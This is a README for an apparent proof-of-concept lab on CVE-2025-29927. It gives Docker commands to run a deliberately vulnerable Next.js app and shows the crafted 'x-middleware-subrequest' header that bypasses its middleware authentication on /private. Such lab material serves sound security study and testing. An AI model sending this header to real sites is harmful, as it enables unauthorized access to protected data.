# Next.js Middleware Exploit: CVE-2025-29927 Authorization Bypass POC
This folder contains a sample web application vulnerable to [CVE-2025-29927](https://zeropath.com/blog/nextjs-middleware-cve-2025-29927-auth-bypass), an authorization bypass vulnerability in NextJS when an attacker adds a specially-crafted HTTP header.

## Running the application

Run it:


```
docker build . -t vulnerable-app
docker run -p 3000:3000 --name vulnerable-app --rm vulnerable-app
```

## Exploitation steps

The application has a private endpoint `/private` that is accessible only by authenticated users.  


You can bypass authentication by adding the following HTTP header to the request:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
